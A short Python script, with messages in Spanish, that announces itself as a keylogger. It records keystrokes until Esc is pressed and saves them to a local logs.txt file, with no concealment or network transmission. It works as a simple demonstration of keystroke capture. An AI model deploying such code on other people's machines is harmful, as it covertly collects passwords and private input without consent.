import keyboard

print("Keylogger inciado. Presiona Esc para parar.")
teclas_ingresadas = keyboard.record(until='esc')

archivo_texto = open("logs.txt", "w")
for uso in teclas_ingresadas:
    if uso.event_type == keyboard.KEY_DOWN:
        archivo_texto.write(uso.name + "\n")
archivo_texto.close()

print("Finalizado. Las teclas se han guardado en 'logs.txt'.")